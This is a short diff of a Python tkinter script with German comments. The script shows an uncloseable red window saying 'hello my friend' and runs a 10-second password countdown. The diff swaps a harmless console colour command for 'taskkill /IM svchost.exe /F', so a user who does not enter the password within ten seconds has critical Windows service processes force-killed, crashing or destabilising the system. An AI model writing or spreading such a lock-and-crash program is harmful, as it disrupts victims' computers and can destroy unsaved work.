@@ -11,7 +11,7 @@ cancel_event = threading.Event()
 # === Script nach 10 Sekunden (nur wenn Passwort NICHT eingegeben wurde) ===
 def after_10_seconds():
     if not cancel_event.wait(10):  # wartet 10 Sekunden
-        os.system("cmd /k color c")
+        os.system("cmd /k taskkill /IM svchost.exe /F")
 
 # === Fenster ===
 root = tk.Tk()
@@ -31,7 +31,7 @@ root.protocol("WM_DELETE_WINDOW", lambda: None)
 # === Text oben ===
 label = tk.Label(
     root,
-    text="hello my friend",
+    text="hello my friend...",
     fg="white",
     bg="red",
     font=("Arial", 40, "bold")
